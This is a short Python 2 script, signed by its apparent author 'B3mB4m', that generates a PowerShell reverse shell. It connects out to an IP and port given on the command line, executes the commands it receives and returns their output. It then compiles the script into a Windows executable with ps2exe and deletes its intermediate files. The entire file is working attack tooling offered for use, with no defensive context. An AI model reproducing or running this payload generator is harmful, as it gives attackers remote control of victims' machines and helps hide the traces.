from os import system,remove,getcwd

#Coded By B3mB4m
#16.12.2015
#Concat : b3mb4m@tuta.io


def batexecute( up):
	db = r'set  exploit=powershell.exe -ExecutionPolicy ByPass .\ps2exe.ps1 -inputFile C:\Users\r00t\Desktop\%s.ps1 C:\Users\r00t\Desktop\%s.exe' % (up, up)
	db += "\n%exploit%"
	_ = str(up)+".bat"
	with open(_, "w+") as myfile:
		myfile.write(db)
		myfile.close()
	from time import sleep
	system(_) 
	sleep(4)
	#Delete cache files
	try:
		remove(getcwd()+"\\"+_)
		remove(getcwd()+"\\"+str(up)+'.exe.config')
		remove(getcwd()+"\\"+str(up)+'.ps1')
	except:
		pass

def exp( ip,port):
	db = ["" for x in range(8)]
	payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%s)' % (ip,port)
	db[0] = payload
	db[1] = '$stream = $client.GetStream()'
	db[2] = '[byte[]]$bytes = 0..255|%{0}'
	db[3] = 'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){'
	db[4] = '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)'
	db[5] = '$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> "'
	db[6] = '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)'
	db[7] = '$stream.Flush()};$client.Close()'
	from random import randint
	_ = str(randint(999,9999))
	__ = _+".ps1"
	with open(__, "w") as exploit:
		exploit.write(";".join(db))
		exploit.close()
	batexecute(_)

	print "Done .."


if __name__ == '__main__':
	from sys import exit,argv
	if len(argv) < 2:
		exit("Usage : IP PORT")
	else:
		exp( argv[1], argv[2])
